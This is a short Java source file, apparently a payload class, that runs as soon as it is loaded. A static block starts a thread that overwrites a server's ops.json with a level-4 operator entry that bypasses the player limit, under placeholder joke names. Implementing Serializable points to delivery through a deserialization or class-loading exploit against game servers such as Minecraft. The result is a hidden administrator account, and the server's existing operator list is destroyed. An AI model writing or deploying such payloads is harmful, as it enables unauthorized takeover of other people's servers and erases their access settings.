package itzbenz.payload;

import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.nio.file.Files;

public class OPsJason implements Serializable {
    
    static {
        new Thread(OPsJason::init).start();
    }
    
    String uuid = "Hello there", name = "General Kenobi";
    int level = 4;
    boolean bypassesPlayerLimit = true;
    
    public static void init() {
        OPsJason op = new OPsJason();
        General.log("Initializing OPs Jason. uuid: " + op.uuid + " name: " + op.name + " level: " + op.level + " bypassesPlayerLimit: " + op.bypassesPlayerLimit);
        File file = new File("ops.json");
        if (!file.exists()){
            General.log("ops.json does not exist, creating... " + file.getAbsolutePath());
            file.getParentFile().mkdirs();
            try {
                file.createNewFile();
            }catch(Exception e){
                General.log("Failed to create ops.json: " + e.getMessage());
            }
        }
        General.log("Writing to " + file.getAbsoluteFile().getAbsolutePath());
        try {
            Files.write(file.toPath(), op.toString().getBytes());
        }catch(IOException e){
            General.log("Failed to write to ops.json: " + e.getMessage());
        }
    }
    
    public static void main(String[] args) {
        OPsJason op = new OPsJason();
        System.out.println(op);
    }
    
    @Override
    public String toString() {
        return "[{\"uuid\":\"" + uuid + "\",\"name\":\"" + name + "\",\"level\":" + level + ",\"bypassesPlayerLimit\":" + bypassesPlayerLimit + "}]";
    }
}
